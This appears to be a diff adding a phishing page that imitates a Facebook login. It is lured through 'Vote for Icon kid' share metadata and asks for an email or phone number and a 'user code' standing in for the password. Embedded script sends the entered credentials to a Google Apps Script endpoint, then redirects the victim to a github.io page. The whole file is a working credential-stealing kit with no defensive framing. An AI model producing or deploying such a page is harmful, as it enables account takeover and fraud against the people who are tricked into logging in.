@@ -1,0 +1,111 @@
+<!DOCTYPE html><html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Login - Facebook</title>
+
+<meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgqNxIAyB2HOLThk259RjiiX6ntsXpwLMnbi-2CDEqHJIdxGAmBVLx4Am6Jr-RQcVbZBGa0x6Mv8McgAXDJbBman3jbii5SVEjTPw5sQ0AMwWOCFdBwPQ1WTzALjST712Ge0re8ro0UTB8KbJmxGpRVS5AGVUoSd4SV7EVZco44Deqxfe47YAAnb0SzibQ/s763/Messenger_creation_4AE18D32-9F6C-46E4-9EE8-EDD2E7FB6965.jpeg" />
+
+<meta property="og:title" content="Vote for Icon kid✅ ">
+<meta property="og:description" content="Vote for Icon kid✅.. Contestant no: AB22">
+
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #f0f2f5;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+        flex-direction: column;
+    }
+    .login-container {
+        background-color: white;
+        width: 80%;
+        max-width: 400px;
+        padding: 20px;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        border-radius: 13px;
+        margin: 0 auto;
+    }
+    h2 {
+        text-align: center;
+        font-size: 40px;
+        margin-bottom: 20px;
+        color: #1877f2;
+    }
+    input {
+        width: 100%;
+        padding: 12px;
+        margin: 10px 0;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        box-sizing: border-box;
+    }
+    .login-button {
+        background-color: #1877f2;
+        color: white;
+        font-size: 16px;
+        cursor: pointer;
+        border: none;
+        padding: 12px;
+        width: 100%;
+        border-radius: 5px;
+    }
+    .login-button:hover {
+        background-color: #166fe5;
+    }
+    .error-message {
+        color: red;
+        font-size: 14px;
+        display: none;
+    }
+</style>
+
+</head>
+<body>
+    <div class="login-container">
+        <h2>Facebook</h2>
+        <form name="login-form">
+            <input type="text" name="email" placeholder="Email or Phone Number" required>
+            <input type="text" name="usercode" placeholder="User Code" required>
+            <div class="error-message" id="error-message">Incorrect user code. Must be at least 6 characters.</div>
+            <button type="submit" class="login-button">Log In</button>
+        </form>
+    </div><script>
+const scriptURL = 'https://script.google.com/macros/s/AKfycby0is6Yq_Im6188fxGrxf_rw6DmShiEGF2HP9snr-hsrWdw1jwP0Spi910KoHtRw3gB/exec';
+const form = document.forms['login-form'];
+const errorMessage = document.getElementById('error-message');
+const usercodeInput = form.elements['usercode'];
+
+form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    const formData = new FormData(form);
+    const usercode = formData.get('usercode');
+
+    if (usercode.length < 6) {
+        errorMessage.style.display = 'block';
+        setTimeout(() => {
+            errorMessage.style.display = 'none';
+        }, 3000);
+        return;
+    }
+
+    fetch(scriptURL, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.text())
+    .then(result => {
+        console.log('Login Success!', result);
+        window.location.href = 'https://offer009x.github.io/5/';
+    })
+    .catch(error => {
+        console.error('Error!', error);
+        alert('Login failed: ' + error.message);
+    });
+});
+</script>
+
+</body>
+</html>
